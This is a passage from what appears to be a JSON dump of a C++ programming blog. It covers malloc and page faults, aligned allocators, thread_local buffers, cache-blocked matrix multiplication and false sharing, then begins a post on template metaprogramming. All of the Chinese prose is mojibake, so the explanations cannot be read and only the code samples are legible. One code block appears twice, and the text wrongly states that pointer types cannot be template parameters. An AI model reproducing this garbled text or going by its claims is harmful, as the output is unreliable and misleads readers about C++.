éƒ½éœ€è¦è®¿é—®å››éå†…å­˜ï¼Œå˜æˆäº†ï¼šè¯»+å†™ï¼Œä»è€Œæ¯ä¸ªå…ƒç´ åªéœ€è¦è®¿é—®ä¸¤éå†…å­˜ã€‚ åŒæ—¶ï¼Œå¯ä»¥åˆ©ç”¨SIMDä¼˜åŒ–ï¼ˆç¼–è¯‘å™¨ä¼˜åŒ–ç¬”è®°éƒ¨åˆ†ï¼‰ï¼Œæ¯”å¦‚ gcc unrollã€å±€éƒ¨å˜é‡å¹¶è¡Œæ‰¹å¤„ç†ã€‚ å†…å­˜çš„åˆ†é… å½“è°ƒç”¨ malloc æ—¶ï¼Œæ“ä½œç³»ç»Ÿå¹¶ä¸ä¼šå®é™…åˆ†é…é‚£ä¸€å—å†…å­˜ï¼Œè€Œæ˜¯å°†è¿™ä¸€æ®µå†…å­˜æ ‡è®°ä¸ºâ€œä¸å¯ç”¨â€ã€‚å½“ç”¨æˆ·è¯•å›¾è®¿é—®ï¼ˆå†™å…¥ï¼‰è¿™ä¸€ç‰‡å†…å­˜æ—¶ï¼Œç¡¬ä»¶å°±ä¼šè§¦å‘æ‰€è°“çš„ç¼ºé¡µä¸­æ–­ï¼ˆpage faultï¼‰ï¼Œè¿›å…¥æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œå†…æ ¸ä¼šæŸ¥æ‰¾å½“å‰è¿›ç¨‹çš„ malloc å†å²è®°å½•ã€‚ å¦‚æœå‘ç°ç”¨æˆ·å†™å…¥çš„åœ°å€æ˜¯ä»–æ›¾ç» malloc è¿‡çš„åœ°å€åŒºé—´ï¼Œåˆ™æ‰§è¡Œå®é™…çš„å†…å­˜åˆ†é…ï¼Œå¹¶æ ‡è®°è¯¥æ®µå†…å­˜ä¸ºâ€œå¯ç”¨â€ï¼Œä¸‹æ¬¡è®¿é—®å°±ä¸ä¼šå†äº§ç”Ÿç¼ºé¡µä¸­æ–­äº†ï¼›è€Œå¦‚æœç”¨æˆ·å†™å…¥çš„åœ°å€æ ¹æœ¬ä¸æ˜¯ä»– malloc è¿‡çš„åœ°å€ï¼Œé‚£å°±è¯´æ˜ä»–ç¡®å®çŠ¯é”™äº†ï¼Œå°±æŠ›å‡ºæ®µé”™è¯¯ï¼ˆsegmentation faultï¼‰ã€‚ å½“æ‰§è¡Œä»£ç  std::vectorã€new intn ä¼šåˆå§‹åŒ–æ•°ç»„ä¸º0ï¼Œå®é™…åˆ†é…å†…å­˜ã€‚ malloc(n * sizeof(int))ã€new int[n] ä¸ä¼šåˆå§‹åŒ–æ•°ç»„ä¸º0ï¼Œä¸ä¼šå®é™…åˆ†é…å†…å­˜ã€‚ ç¬¬ä¸€æ¬¡å¾€mallocçš„æ•°ç»„é‡Œé¢èµ‹å€¼æ—¶ï¼Œå› ä¸ºè¿™æ—¶æ“ä½œç³»ç»Ÿè¿˜æ²¡æœ‰ç»™è¿™ä¸ªæ•°ç»„åˆ†é…å†…å­˜ï¼Œæ‰€ä»¥ä¼šè§¦å‘ç¼ºé¡µä¸­æ–­ï¼Œè¿›å…¥æ“ä½œç³»ç»Ÿå†…æ ¸ç»™æ•°ç»„åˆ†é…å†…å­˜ï¼Œæ˜¯å†…æ ¸æ‰§è¡Œå†…å­˜åˆ†é…çš„è¿™ä¸ªåŠ¨ä½œï¼Œä¼šèŠ±è´¹é¢å¤–çš„æ—¶é—´ã€‚ æŒ‰é¡µåˆ†é… å½“ä¸€ä¸ªå°šä¸”å¤„äºâ€œä¸å¯ç”¨â€çš„ malloc è¿‡çš„åŒºé—´è¢«è®¿é—®ï¼Œæ“ä½œç³»ç»Ÿä¸æ˜¯æŠŠæ•´ä¸ªåŒºé—´å…¨éƒ¨åˆ†é…å®Œæ¯•ï¼Œè€Œæ˜¯åªæŠŠå½“å‰å†™å…¥åœ°å€æ‰€åœ¨çš„é¡µé¢ï¼ˆ4KB å¤§å°ï¼‰ç»™åˆ†é…ä¸Šã€‚ ä¹Ÿå°±æ˜¯è¯´ç”¨æˆ·è®¿é—® a[0] ä»¥ååªåˆ†é…äº† 4KB çš„å†…å­˜ã€‚ç­‰åˆ°ç”¨æˆ·è®¿é—®äº† a[1024]ï¼Œä¹Ÿå°±æ˜¯è§¦åŠäº†ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œä»–æ‰ä¼šç»§ç»­åˆ†é…ä¸€ä¸ª 4KB çš„é¡µé¢ï¼Œè¿™æ—¶æ‰å®é™…åˆ†é… 8KB ã€‚ æ¯”å¦‚mallocç”³è¯· 16GB å†…å­˜ï¼Œä½†æ˜¯åªè®¿é—®äº†ä»–çš„å‰ 4KBï¼Œè¿™æ ·åªæœ‰ä¸€ä¸ªé¡µè¢«åˆ†é…ï¼Œæ‰€ä»¥éå¸¸å¿«ã€‚ å†…å­˜é‡å¤åˆ©ç”¨ å³ä½¿ç¬¬äºŒæ¬¡åˆ†é…çš„æ˜¯åŒä¸€æ®µå·®ä¸å¤šå¤§å°çš„å†…å­˜ï¼ˆç¬¬ä¸€æ¬¡åˆ†é…å†…å­˜ä¸ä¼šå†ä½¿ç”¨ï¼‰ï¼Œä¹Ÿæ˜¯ä¼šäº§ç”Ÿç¼ºé¡µä¸­æ–­ï¼ŒèŠ±è´¹åˆ†é…æ—¶é—´çš„ã€‚ è¿™å°±éœ€è¦æ”¹åŠ¨STLå®¹å™¨çš„allocatorã€‚tbb::cache_aligned_allocator å¯ä»¥æå‡ä¸€å®šçš„æ€§èƒ½ã€‚æœ€å¤§å¥½å¤„åœ¨äºä»–åˆ†é…çš„å†…å­˜åœ°å€ï¼Œæ°¸è¿œä¼šå¯¹é½åˆ°ç¼“å­˜è¡Œï¼ˆ64å­—èŠ‚ï¼‰ã€‚ æ ‡å‡†åº“çš„ new å’Œ malloc å¯ä»¥ä¿è¯ 16 å­—èŠ‚å¯¹é½ã€‚ 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;vector&gt;#include \"ticktock.h\"#include &lt;cstdlib&gt;constexpr size_t n = 1&lt;&lt;20;int main() &#123; std::cout &lt;&lt; std::boolalpha; for (int i = 0; i &lt; 5; i++) &#123; std::vector&lt;int&gt; arr(n); bool is_aligned = (uintptr_t)arr.data() % 16 == 0; std::cout &lt;&lt; \"std: \" &lt;&lt; is_aligned &lt;&lt; std::endl; &#125; for (int i = 0; i &lt; 5; i++) &#123; auto arr = (int *)malloc(n * sizeof(int)); bool is_aligned = (uintptr_t)arr % 16 == 0; std::cout &lt;&lt; \"malloc: \" &lt;&lt; is_aligned &lt;&lt; std::endl; free(arr); &#125; return 0;&#125; è¿˜æœ‰ _mm_malloc(n, aalign) å¯ä»¥åˆ†é…å¯¹é½åˆ°ä»»æ„ aalign å­—èŠ‚çš„å†…å­˜ã€‚ä»–åœ¨ &lt;xmmintrin.h&gt; è¿™ä¸ªå¤´æ–‡ä»¶é‡Œã€‚æ˜¯ x86 ç‰¹æœ‰çš„ï¼Œå¹¶ä¸”éœ€è¦é€šè¿‡ _mm_free æ¥é‡Šæ”¾ã€‚ è¿˜æœ‰ä¸€ä¸ªè·¨å¹³å°ç‰ˆæœ¬ï¼ˆæ¯”å¦‚ç”¨äº arm æ¶æ„ï¼‰çš„ aligned_alloc(align, n)ï¼Œä»–ä¹Ÿå¯ä»¥åˆ†é…å¯¹é½åˆ°ä»»æ„ align å­—èŠ‚çš„å†…å­˜ï¼Œé€šè¿‡ free é‡Šæ”¾ã€‚ 123456789101112131415161718192021222324#include &lt;iostream&gt;#include &lt;vector&gt;#include \"ticktock.h\"#include &lt;cstdlib&gt;#include &lt;x86intrin.h&gt;constexpr size_t n = 1&lt;&lt;20;int main() &#123; std::cout &lt;&lt; std::boolalpha; for (int i = 0; i &lt; 5; i++) &#123; auto arr = (int *)_mm_malloc(n * sizeof(int), 4096); bool is_aligned = (uintptr_t)arr % 4096 == 0; std::cout &lt;&lt; \"_mm_malloc: \" &lt;&lt; is_aligned &lt;&lt; std::endl; _mm_free(arr); &#125; for (int i = 0; i &lt; 5; i++) &#123; auto arr = (int *)aligned_alloc(4096, n * sizeof(int)); bool is_aligned = (uintptr_t)arr % 4096 == 0; std::cout &lt;&lt; \"aligned_alloc: \" &lt;&lt; is_aligned &lt;&lt; std::endl; free(arr); &#125; return 0;&#125; åˆ©ç”¨ aligned_alloc å¯ä»¥å®ç°ä»»æ„å¯¹é½çš„allocatorã€‚stackoverflowé“¾æ¥ã€‚ ä½¿ç”¨è¿™ä¸ªallocatorï¼Œå¯ä»¥æ”¹å˜å®¹å™¨çš„å†…å­˜åˆ†é…å¸ƒå±€ã€‚ 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;vector&gt;#include \"ticktock.h\"#include \"alignalloc.h\"constexpr size_t n = 1&lt;&lt;20;int main() &#123; std::cout &lt;&lt; std::boolalpha; for (int i = 0; i &lt; 5; i++) &#123; std::vector&lt;int, AlignedAllocator&lt;int&gt;&gt; arr(n); bool is_aligned = (uintptr_t)arr.data() % 64 == 0; std::cout &lt;&lt; \"64: \" &lt;&lt; is_aligned &lt;&lt; std::endl; &#125; for (int i = 0; i &lt; 5; i++) &#123; std::vector&lt;int, AlignedAllocator&lt;int, 4096&gt;&gt; arr(n); bool is_aligned = (uintptr_t)arr.data() % 4096 == 0; std::cout &lt;&lt; \"4096: \" &lt;&lt; is_aligned &lt;&lt; std::endl; &#125; return 0;&#125; ä¸´æ—¶æ•°ç»„ä¼˜åŒ– å¦‚æœä¸€ä¸ªç»å¸¸è°ƒç”¨çš„å‡½æ•°ä¸­ï¼Œç”³è¯·äº†ä¸´æ—¶æ•°ç»„ï¼Œå¯ä»¥ä¼˜åŒ–ï¼Œä½¿å¾—ä¸ç”¨æ¯æ¬¡éƒ½é‡æ–°åˆ†é…ä¸€æ®µå†…å­˜ï¼Œæµªè´¹æ—¶é—´ã€‚ å£°æ˜ä¸º static å˜é‡ï¼Œè¿™æ ·ç¬¬äºŒæ¬¡è¿›å…¥ func çš„æ—¶å€™è¿˜æ˜¯åŒä¸€ä¸ªæ•°ç»„ï¼Œä¸éœ€è¦é‡å¤åˆ†é…å†…å­˜ï¼› thread_local è¡¨ç¤ºå¦‚æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹ä¿ç•™ä¸€ä¸ª tmp å¯¹è±¡çš„å‰¯æœ¬ï¼Œé˜²æ­¢å¤šçº¿ç¨‹è°ƒç”¨ func å‡ºé”™ã€‚ è¿”å›æ—¶ï¼ˆæˆ–è€…è¿›å…¥æ—¶ï¼‰è°ƒç”¨ tmp.clear() æ¸…é™¤å·²æœ‰æ•°æ®ã€‚ç”±äº vector çš„ç‰¹æ€§ï¼Œä»–åªä¼šæŠŠ size() æ ‡è®°ä¸º 0 å¹¶è°ƒç”¨å…¶æˆå‘˜çš„è§£æ„å‡½æ•°ï¼Œè€Œä¸ä¼šå®é™…é‡Šæ”¾å†…å­˜ï¼ˆfreeï¼‰ã€‚ ç¬¬äºŒæ¬¡è¿›å…¥çš„æ—¶å€™ï¼Œå¦‚æœ n ä¸è¶…è¿‡ä¸Šä¸€æ¬¡çš„å¤§å°ï¼Œå°±è¿˜æ˜¯ç”¨çš„ç¬¬ä¸€æ¬¡åˆ†é…çš„å†…å­˜ï¼Œé¿å…äº†é‡æ–°åˆ†é…çš„å¼€é”€ã€‚ 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;algorithm&gt;#include \"ticktock.h\"float func(int n) &#123; // ä¼˜åŒ– static thread_local std::vector&lt;float&gt; tmp; for (int i = 0; i &lt; n; i++) &#123; tmp.push_back(i / 15 * 2.718f); &#125; std::reverse(tmp.begin(), tmp.end()); float ret = tmp[32]; // ä¼˜åŒ– tmp.clear(); return ret;&#125;int main() &#123; constexpr int n = 1&lt;&lt;25; std::cout &lt;&lt; func(n) &lt;&lt; std::endl; return 0;&#125; äºŒç»´æ•°ç»„ C++/C å¯¹äºŒç»´æ•°ç»„åˆ†é…å†…å­˜æ˜¯ä¸€ç»´çš„ï¼Œå¹¶æ²¡æœ‰äºŒçº§æŒ‡é’ˆçš„å¿…è¦ï¼Œæ—¶é—´å’Œç©ºé—´æ•ˆç‡éƒ½æ¯”è¾ƒä½ï¼ˆæ²¡æœ‰å†’çŠ¯ java çš„æ„æ€ï¼‰ã€‚ C++/C èŒƒå›´æ˜¯æŒ‰ç…§è¡Œä¸»åºï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œa[i][j] ç¿»è¯‘ä¸º a[i * num_of_column + j]ã€‚ä¹Ÿå°±æ˜¯è¯´å…ˆéå† j ï¼Œå¯ä»¥è¿ç»­è®¿é—®å†…å­˜ï¼Œç¼“å­˜åˆ©ç”¨ç‡é«˜ã€‚è€Œå¦‚æœå…ˆè®¿é—® i ï¼Œå°±å˜æˆäº†è·³è·ƒå†…å­˜åœ°å€çš„è®¿é—®ã€‚ ä¸€ä¸ªä¼˜åŒ–çš„ndarrayå°è£…ï¼Œé’ˆå¯¹å›¾åƒå¤„ç†éœ€è¦ï¼Œå¢åŠ äº†è¾¹ç•Œæ‰©å……è®¾è®¡ï¼Œæ–¹ä¾¿SIMDçŸ¢é‡åŒ–ã€‚ çŸ©é˜µä¹˜æ³•ä¼˜åŒ– ç›´è§‚å®ç° 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;array&gt;#include &lt;benchmark/benchmark.h&gt;#include &lt;x86intrin.h&gt;#include &lt;omp.h&gt;#include \"ndarray.h\"constexpr int n = 1&lt;&lt;10;ndarray&lt;2, float&gt; a(n, n);ndarray&lt;2, float&gt; b(n, n);ndarray&lt;2, float&gt; c(n, n);void BM_matmul(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123; for (int j = 0; j &lt; n; j++) &#123; for (int i = 0; i &lt; n; i++) &#123; for (int t = 0; t &lt; n; t++) &#123; a(i, j) += b(i, t) * c(t, j); &#125; &#125; &#125; &#125;&#125;BENCHMARK(BM_matmul);BENCHMARK_MAIN(); a(i, j) å§‹ç»ˆåœ¨ä¸€ä¸ªåœ°å€ä¸åŠ¨ï¼ˆä¸€èˆ¬ï¼‰ï¼Œå¦‚æœæœ‰å¤šä¸ªiå€¼åŒæ—¶å¤„ç†ä¼šæ›´å¥½ã€‚ b(i, t) æ¯æ¬¡è·³è·ƒ n é—´éš”çš„è®¿é—®ï¼ˆåï¼‰ã€‚ c(t, j) è¿ç»­çš„é¡ºåºè®¿é—®ï¼ˆå¥½ï¼‰ã€‚ å› ä¸ºå­˜åœ¨ä¸è¿ç»­çš„ b å’Œä¸€ç›´ä¸åŠ¨çš„ aï¼Œå¯¼è‡´çŸ¢é‡åŒ–å¤±è´¥ï¼Œä¸€æ¬¡åªèƒ½å¤„ç†ä¸€ä¸ªæ ‡é‡ï¼ŒCPUä¹Ÿæ— æ³•å¯åŠ¨æŒ‡ä»¤çº§å¹¶è¡Œï¼ˆILPï¼‰ã€‚ å¯¹å¾ªç¯è¿›è¡Œåˆ†å—ï¼Œå†çœ‹çœ‹è®¿å­˜çš„è§„å¾‹ï¼š 12345678910111213141516171819// ...void BM_matmul_blocked(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123; for (int j = 0; j &lt; n; j++) &#123; for (int iBase = 0; iBase &lt; n; iBase += 32) &#123; for (int t = 0; t &lt; n; t++) &#123; for (int i = iBase; i &lt; iBase + 32; i++) &#123; a(i, j) += b(i, t) * c(t, j); &#125; &#125; &#125; &#125; &#125;&#125;BENCHMARK(BM_matmul_blocked);BENCHMARK_MAIN(); a(i, j) è¿ç»­ 32 æ¬¡é¡ºåºè®¿é—®ï¼ˆå¥½ï¼‰ã€‚ b(i, t) è¿ç»­ 32 æ¬¡é¡ºåºè®¿é—®ï¼ˆå¥½ï¼‰ã€‚ c(t, j) 32 æ¬¡åœ¨ä¸€ä¸ªåœ°å€ä¸åŠ¨ï¼ˆä¸€èˆ¬ï¼‰ã€‚ è¿™æ ·å°±æ¶ˆé™¤ä¸è¿ç»­çš„è®¿é—®äº†ï¼Œä»è€Œå†…éƒ¨çš„ i å¾ªç¯å¯ä»¥é¡ºåˆ©çŸ¢é‡åŒ–ï¼Œä¸”å¤šä¸ªå¾ªç¯ä½“ä¹‹é—´æ²¡æœ‰ä¾èµ–å…³ç³»ï¼ŒCPUå¾—ä»¥å¯åŠ¨æŒ‡ä»¤çº§å¹¶è¡Œï¼Œç¼“å­˜é¢„å–ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œã€‚ ç”šè‡³å¯ä»¥è¿›ä¸€æ­¥å°† j ä¹Ÿåˆ†å—åŒ–ï¼š 12345678910111213141516void BM_matmul_blocked_both(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123; for (int jBase = 0; jBase &lt; n; jBase += 16) &#123; for (int iBase = 0; iBase &lt; n; iBase += 16) &#123; for (int j = jBase; j &lt; jBase + 16; j++) &#123; for (int t = 0; t &lt; n; t++) &#123; for (int i = iBase; i &lt; iBase + 16; i++) &#123; a(i, j) += b(i, t) * c(t, j); &#125; &#125; &#125; &#125; &#125; &#125;&#125;BENCHMARK(BM_matmul_blocked_both); morton code å¦‚æœå¯¹çŸ©é˜µè¿›è¡Œè½¬ç½®ï¼Œåº”è¯¥ä½¿ç”¨è¡Œä¸»åºè¿˜æ˜¯åˆ—ä¸»åºï¼Ÿæ˜¾ç„¶å¿…æœ‰ä¸€ä¸ªçŸ©é˜µè¯»å†™ä¼šå¾ˆä¸å‹å¥½ã€‚ morton code ä½¿ç”¨ä¸€ä¸ªæ—¶é—´å˜é‡ tï¼Œç”Ÿæˆä¸‹ä¸€ä¸ªè®¿é—®å…ƒç´  (x, y) åæ ‡ï¼Œå°½é‡ä¿è¯æ•°æ®åœ¨æ—¶é—´ t ä¸Šæ˜¯æ¥è¿‘çš„ï¼ŒåŒæ—¶äºŒç»´ç©ºé—´ä¸Š (x,y) ä¹Ÿæ˜¯æ¥è¿‘çš„ï¼Œåˆ©ç”¨è®¿å­˜å±€åŸŸæ€§ï¼Œå‘æŒ¥ç¼“å­˜ä¼˜åŠ¿ã€‚ å¤šæ ¸ä¸‹çš„ç¼“å­˜ å¦‚æœå¤šä¸ªæ ¸å¿ƒåŒæ—¶è®¿é—®çš„åœ°å€éå¸¸æ¥è¿‘ï¼Œè¿™æ—¶å€™ä¼šå˜å¾—å¾ˆæ…¢ã€‚ å› ä¸º CPU ä¹‹é—´é€šä¿¡çš„æœ€å°å•ä½ä¹Ÿæ˜¯ ç¼“å­˜è¡Œï¼ˆ64 å­—èŠ‚ï¼‰ï¼Œå¦‚æœä¸¤ä¸ªæ ¸å¿ƒè®¿é—®åˆ°äº†çš„åŒä¸€ç¼“å­˜è¡Œï¼Œå‡è®¾ä¸€ä¸ªæ ¸å¿ƒä¿®æ”¹äº†è¯¥ç¼“å­˜è¡Œçš„å‰32å­—èŠ‚ï¼Œå¦ä¸€ä¸ªä¿®æ”¹äº†å32å­—èŠ‚ï¼ŒåŒæ—¶å†™å›ï¼Œåªæœ‰ä¸€ä¸ªä¼šç”Ÿæ•ˆã€‚ æ‰€ä»¥CPUä¸ºäº†å®‰å…¨èµ·è§ï¼ŒåŒæ—¶åªèƒ½å…è®¸ä¸€ä¸ªæ ¸å¿ƒå†™å…¥åŒä¸€åœ°å€çš„ç¼“å­˜è¡Œã€‚ä»è€Œå¯¼è‡´è¯»å†™è¿™ä¸ªå˜é‡çš„é€Ÿåº¦å—é™äºä¸‰çº§ç¼“å­˜çš„é€Ÿåº¦ï¼Œè€Œä¸æ˜¯ä¸€çº§ç¼“å­˜çš„é€Ÿåº¦ã€‚ä¸èƒ½åŒæ—¶å†™ï¼Œåªæœ‰å†å–ä¸€æ¬¡ã€‚ é”™è¯¯å…±äº«åªä¼šå‘ç”Ÿåœ¨å†™å…¥çš„æƒ…å†µï¼Œå¦‚æœå¤šä¸ªæ ¸å¿ƒåŒæ—¶è¯»å–ä¸¤ä¸ªå¾ˆé è¿‘çš„å˜é‡ï¼Œæ˜¯ä¸ä¼šäº§ç”Ÿå†²çªçš„ï¼Œä¹Ÿæ²¡æœ‰æ€§èƒ½æŸå¤±ã€‚ ä¼˜åŒ– åªéœ€è¦æŠŠæ¯ä¸ªæ ¸å¿ƒå†™å…¥çš„åœ°å€å°½å¯èƒ½åˆ†æ•£å¼€äº†å°±è¡Œäº†ã€‚æ¯”å¦‚è¿™é‡Œï¼Œæˆ‘ä»¬æŠŠæ¯ä¸ªæ ¸å¿ƒè®¿é—®çš„åœ°æ–¹è·¨è¶Š 16KB ï¼ˆè¶³å¤Ÿè¿œå°±è¡Œï¼‰ï¼Œè¿™æ ·CPUå°±çŸ¥é“æ¯ä¸ªæ ¸å¿ƒä¹‹é—´ä¸ä¼šå‘ç”Ÿå†²çªï¼Œä»è€Œå¯ä»¥æ”¾å¿ƒåœ°æ”¾åœ¨ä¸€çº§ç¼“å­˜é‡Œï¼Œä¸ç”¨æ‹…å¿ƒä¼šä¸ä¼šå’Œå…¶ä»–æ ¸å¿ƒå…±ç”¨äº†ä¸€ä¸ªç¼“å­˜è¡Œäº†ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"memory manage","slug":"memory-manage","permalink":"https://racleray.github.io/tags/memory-manage/"}],"author":"HeRui"},{"title":"C++æ¨¡ç‰ˆå…ƒç¼–ç¨‹","slug":"C-æ¨¡ç‰ˆå…ƒç¼–ç¨‹","date":"2023-06-02T14:34:53.000Z","updated":"2024-01-09T10:24:49.642Z","comments":true,"path":"posts/9de18668.html","link":"","permalink":"https://racleray.github.io/posts/9de18668.html","excerpt":"C++ æ¨¡ç‰ˆå…ƒç¼–ç¨‹","text":"æ¨¡æ¿å…ƒç¼–ç¨‹ æ¨¡æ¿å‡½æ•°è‡ªåŠ¨æ¨å¯¼å‚æ•°ç±»å‹ã€‚æœ‰æ—¶å€™ï¼Œä¸€ä¸ªç»Ÿä¸€çš„å®ç°æ»¡è¶³ä¸äº†æŸäº›ç‰¹æ®Šæƒ…å†µã€‚åªéœ€æ·»åŠ ä¸€ä¸ª ç‰¹åŒ–çš„é‡è½½ã€ 1234567891011121314151617#include &lt;iostream&gt;template &lt;class T&gt;T twice(T t) &#123; return t * 2;&#125;std::string twice(std::string t) &#123; return t + t;&#125;int main() &#123; std::cout &lt;&lt; twice(21) &lt;&lt; std::endl; std::cout &lt;&lt; twice(3.14f) &lt;&lt; std::endl; std::cout &lt;&lt; twice(2.718) &lt;&lt; std::endl; std::cout &lt;&lt; twice(\"hello\") &lt;&lt; std::endl;&#125; ä½†æ˜¯è¿™æ ·ä¹Ÿæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯å¦‚æœæˆ‘ç”¨ twice(â€œhelloâ€) è¿™æ ·å»è°ƒç”¨ï¼Œä»–ä¸ä¼šè‡ªåŠ¨éšå¼è½¬æ¢åˆ° std::string å¹¶è°ƒç”¨é‚£ä¸ªç‰¹åŒ–å‡½æ•°ï¼Œè€Œæ˜¯ä¼šå»è°ƒç”¨æ¨¡æ¿å‡½æ•° twice&lt;char *&gt;(â€œhelloâ€)ï¼Œä»è€Œå‡ºé”™ã€‚ ä½¿ç”¨SFINAEæœºåˆ¶ï¼Œå¯ä»¥è§£å†³ï¼Œæ¯”å¦‚åˆ©ç”¨ has_reserve å¯ä»¥ç”¨æ¥é…åˆ enale_if å®ç°ç¼–è¯‘æœŸçš„é˜»æ–­ï¼Œå°±æ˜¯è¯´ï¼Œæ ¹æ®æ¨¡æ¿æ˜¯å¦èƒ½æˆåŠŸå±•å¼€ï¼Œé€‰æ‹©ä¸åŒçš„ç¼–è¯‘ç›®æ ‡ä»£ç æ®µï¼š 123456789101112131415161718192021222324252627282930// template&lt;class T&gt;// struct enable_if&lt;true, T&gt; &#123; typedef T type; &#125;;// template&lt;bool B, class T = void&gt;// struct enable_if &#123;&#125;;// template&lt; bool B, class T = void &gt;// using enable_if_t = typename enable_if&lt;B,T&gt;::type;// æ˜¯ C ç±»å‹template &lt;typename C, typename T&gt;enable_if_t&lt;has_reserve&lt;C&gt;::value, void&gt;append(C&amp; container, T* ptr, size_t size)&#123; container.reserve( container.size() + size); ...&#125;// ä¸æ˜¯ C ç±»å‹template &lt;typename C, typename T&gt;enable_if_t&lt;!has_reserve&lt;C&gt;::value, void&gt;append(C&amp; container, T* ptr, size_t size)&#123; ....&#125; é»˜è®¤å‚æ•°ç±»å‹ å¯ä»¥é€šè¿‡ template &lt;class T = int&gt; è¡¨ç¤ºè°ƒç”¨è€…æ²¡æœ‰æŒ‡å®šæ—¶ï¼ŒT é»˜è®¤ä¸º int 12345678910111213#include &lt;iostream&gt;template &lt;class T = int&gt;T two() &#123; return 2;&#125;int main() &#123; std::cout &lt;&lt; two&lt;int&gt;() &lt;&lt; std::endl; std::cout &lt;&lt; two&lt;float&gt;() &lt;&lt; std::endl; std::cout &lt;&lt; two&lt;double&gt;() &lt;&lt; std::endl; std::cout &lt;&lt; two() &lt;&lt; std::endl; // ç­‰ä»·äº two&lt;int&gt;()&#125; æ•´æ•°ä¹Ÿå¯ä»¥ä½œä¸ºå‚æ•°ï¼Œä¸è¿‡æ¨¡æ¿å‚æ•°åªæ”¯æŒæ•´æ•°ç±»å‹ï¼ˆåŒ…æ‹¬ enumï¼‰ã€‚ æµ®ç‚¹ç±»å‹ã€æŒ‡é’ˆç±»å‹ï¼Œä¸èƒ½å£°æ˜ä¸ºæ¨¡æ¿å‚æ•°ã€‚ 1234567891011121314#include &lt;iostream&gt;template &lt;int N = 1, class T&gt;void show_times(T msg) &#123; for (int i = 0; i &lt; N; i++) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;&#125;int main() &#123; show_times(\"one\"); show_times&lt;3&gt;(42); show_times&lt;4&gt;('%');&#125; 1234567891011121314#include &lt;iostream&gt;template &lt;int N = 1, class T&gt;void show_times(T msg) &#123; for (int i = 0; i &lt; N; i++) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;&#125;int main() &#123; show_times(\"one\"); show_times&lt;3&gt;(42); show_times&lt;4&gt;('%');&#125; å‚æ•°éƒ¨åˆ†ç‰¹åŒ– func(vector t) è¿™æ ·åˆ™å¯ä»¥é™å®šä»…ä»…ä¸º vector ç±»å‹çš„å‚æ•°ã€‚ 123456789101112131415161718#include &lt;iostream&gt;#include &lt;vector&gt;template &lt;class T&gt;T sum(std::vector&lt;T&gt; const &amp;arr) &#123; T res = 0; for (int i = 0; i &lt; arr.size(); i++) &#123; res += arr[i]; &#125; return res;&#125;int main() &#123; std::vector&lt;int&gt; a = &#123;4, 3, 2, 1&#125;; std::cout &lt;&lt; sum(a) &lt;&lt; std::endl; std::vector&lt;float&gt; b = &#123;3.14f, 2.718f&#125;; std::cout &lt;&lt; sum(b) &lt;&lt; std::endl;&#125; è¿™é‡Œç”¨äº† const &amp; é¿å…ä¸å¿…è¦çš„çš„æ‹·è´ã€‚ ä¸ºä»€ä¹ˆè¦æ”¯æŒæ•´æ•°ä½œä¸ºæ¨¡æ¿å‚æ•° template ä¼ å…¥çš„ Nï¼Œæ˜¯ä¸€ä¸ªç¼–è¯‘æœŸå¸¸é‡ï¼Œæ¯ä¸ªä¸åŒçš„ Nï¼Œç¼–è¯‘å™¨éƒ½ä¼šå•ç‹¬ç”Ÿæˆä¸€ä»½ä»£ç ï¼Œä»è€Œå¯ä»¥å¯¹ä»–åšå•ç‹¬çš„ä¼˜åŒ–ã€‚ è€Œ func(int N)ï¼Œåˆ™å˜æˆè¿è¡ŒæœŸå¸¸é‡ï¼Œç¼–è¯‘å™¨æ— æ³•è‡ªåŠ¨ä¼˜åŒ–ï¼Œåªèƒ½è¿è¡Œæ—¶æ ¹æ®è¢«è°ƒç”¨å‚æ•° N çš„ä¸åŒã€‚ æ¯”å¦‚ show_times&lt;0&gt;() ç¼–è¯‘å™¨å°±å¯ä»¥è‡ªåŠ¨ä¼˜åŒ–ä¸ºä¸€ä¸ªç©ºå‡½æ•°ã€‚å› æ­¤æ¨¡æ¿å…ƒç¼–ç¨‹å¯¹é«˜æ€§èƒ½ç¼–ç¨‹å¾ˆé‡è¦ã€‚ é€šå¸¸æ¥è¯´ï¼Œæ¨¡æ¿çš„å†…éƒ¨å®ç°éœ€è¦è¢«æš´éœ²å‡ºæ¥ï¼Œé™¤éä½¿ç”¨ç‰¹æ®Šçš„æ‰‹æ®µï¼Œå¦åˆ™ï¼Œå®šä¹‰å’Œå®ç°éƒ½å¿…é¡»æ”¾åœ¨å¤´æ–‡ä»¶é‡Œã€‚ ä½†ä¹Ÿæ­£å› å¦‚æ­¤ï¼Œå¦‚æœè¿‡åº¦ä½¿ç”¨æ¨¡æ¿ï¼Œä¼šå¯¼è‡´ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶å¤§å°å‰§å¢ï¼Œç¼–è¯‘å˜å¾—å¾ˆæ…¢ç­‰ã€‚ ç¼–è¯‘æœŸä¼˜åŒ–æ¡ˆä¾‹ ç”¨ä¸€ä¸ª debug å‚æ•°æ§åˆ¶æ˜¯å¦è¾“å‡ºè°ƒè¯•ä¿¡æ¯ã€‚ 1234567891011121314151617#include &lt;iostream&gt;int sumto(int n, bool debug) &#123; int res = 0; for (int i = 1; i &lt;= n; i++) &#123; res += i; if (debug) std::cout &lt;&lt; i &lt;&lt; \"-th: \" &lt;&lt; res 